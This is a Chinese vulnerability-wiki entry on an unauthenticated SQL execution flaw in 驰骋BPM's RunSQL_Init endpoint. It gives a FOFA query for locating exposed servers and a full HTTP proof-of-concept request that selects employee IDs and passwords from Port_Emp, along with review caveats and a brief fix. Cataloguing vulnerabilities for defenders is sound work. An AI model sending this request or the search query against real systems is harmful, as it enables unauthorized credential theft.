---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "驰骋BPM RunSQL_Init未授权SQL执行"
product: "驰骋BPM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "声明未授权"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%A9%B0%E9%AA%8BBPM/%E9%A9%B0%E9%AA%8BBPM%20RunSQL_Init%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"-1564380241\" || body=\"正在登录流程&表单引擎设计器,请稍候\""
fofa_unverified: "icon_hash="
id: "vw-43406138542408b133cd19f4"
entity_id: "ve-43406138542408b133cd19f4"
schema_version: "1"
---

# 驰骋BPM RunSQL_Init未授权SQL执行

## 条目说明

- 对象与具体问题：驰骋BPM；RunSQL_Init未授权SQL执行
- 版本、配置及部署条件：无版本
- 认证与权限前提：声明未授权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA截为icon_hash=，正文完整；HTTP无围栏
- SQL参数直接完整SELECT更像未授权SQL执行，需代码确定分类而非通常拼接注入
- 示例直接获取密码，不宜作最小无害验证；结果仅图
- 在野/影响广/修复build无依据

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

驰骋BPM RunSQL_Init 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

影响版本

驰骋BPM

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 高 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：icon_hash="-1564380241" || body="正在登录流程&表单引擎设计器,请稍候"

POC/EXP：

```http
POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d

------123128312312389898yd98ays98d
Content-Disposition: form-data; name="SQL"

SELECT No,Pass FROM Port_Emp
------123128312312389898yd98ays98d--
```


![image-20240809105149961](./.resource/驰骋BPMRunSQL_InitSQL注入漏洞/media/image-20240809105149961.png)


## 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
